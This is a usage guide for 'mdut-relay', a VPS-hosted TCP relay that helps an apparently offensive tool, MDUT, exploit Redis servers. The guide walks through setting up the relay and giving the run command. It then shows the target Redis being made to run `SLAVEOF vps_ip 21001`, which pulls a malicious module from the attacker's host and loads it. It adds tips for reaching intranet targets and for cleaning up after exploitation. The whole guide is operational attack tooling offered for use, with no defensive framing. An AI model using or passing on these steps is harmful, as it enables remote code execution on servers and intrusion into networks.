# Redis Exploitation Relay Guide (mdut-relay)

## Background

When exploiting Redis through master-slave replication (`SLAVEOF`) to load malicious modules, the target Redis must actively connect to our Rogue Server to sync the payload. However, in the following scenarios, MDUT's local listener is unreachable from the target:

1. **Deep intranet**: MDUT and the target are on different subnets; the target can only reach specific public IPs
2. **SOCKS5 proxy**: MDUT accesses the target via a forward proxy; the local IP is invisible to the target network

**mdut-relay** is a lightweight transparent TCP traffic bridger deployed on a public VPS that bridges the MDUT control stream and the target Redis stream for seamless module delivery.

## How It Works

```
[MDUT Local] ──connect──> [VPS:21000 (control)]
                              │ mdut-relay bidirectional forwarding
[Target Redis] ──connect──> [VPS:21001 (target)]
```

1. `mdut-relay` listens on two ports: control port (default `21000`) and target port (default `21001`)
2. MDUT connects to port `21000` when initiating deployment
3. MDUT instructs the target Redis to execute `SLAVEOF vps_ip 21001`
4. Target Redis connects to port `21001`
5. `mdut-relay` pairs both connections and starts full-duplex transparent forwarding; disconnects after payload delivery

> Built-in 15-second timeout reset: if the target fails to connect, the relay automatically resets to prevent queue deadlocks.

## Usage

### Step 1: Run on VPS

Download the binary for your architecture from [mdut-relay releases](https://github.com/Ch1ngg/mdut-relay/releases), make it executable, and run:

```bash
chmod +x mdut-relay-linux-amd64
./mdut-relay-linux-amd64 -c 21000 -r 21001
```

Parameters:

| Flag | Description | Default |
|------|-------------|---------|
| `-c` | Control port (MDUT client connects here) | `21000` |
| `-r` | Target port (target Redis connects here) | `21001` |

🚨 **Important**: Ensure your VPS firewall/security group allows **inbound TCP on both 21000 and 21001**!

### Step 2: Configure in MDUT

In MDUT's Redis "Inject & Deploy Module" dialog:

1. Select **"VPS Relay (ServeRelay)"** mode
2. **VPS Relay control address**: enter `VPS_IP:21000`
3. **VPS target connection IP**: enter `VPS_IP`
4. Click inject

### Step 3: Done

MDUT automatically:
1. Connects to VPS control port (21000)
2. Instructs target Redis to slaveof VPS target port (21001)
3. Relay pairs both connections and forwards bidirectionally
4. Module payload reaches target and loads
5. Disconnects after completion

## Use Cases

| Scenario | Relay Required? |
|----------|----------------|
| Direct access to target, local has public IP | ❌ No |
| Target via SOCKS5 proxy, local has no public IP | ✅ Yes |
| Target in deep intranet, local unreachable | ✅ Yes |
| Local has public IP but port blocked by firewall | ✅ Yes |

## Notes

- The relay only performs transparent forwarding, no data is stored
- Recommend restarting the relay after each exploitation to avoid residual connections
- Close VPS ports 21000/21001 after exploitation is complete

## Project Repository

[https://github.com/Ch1ngg/mdut-relay](https://github.com/Ch1ngg/mdut-relay)
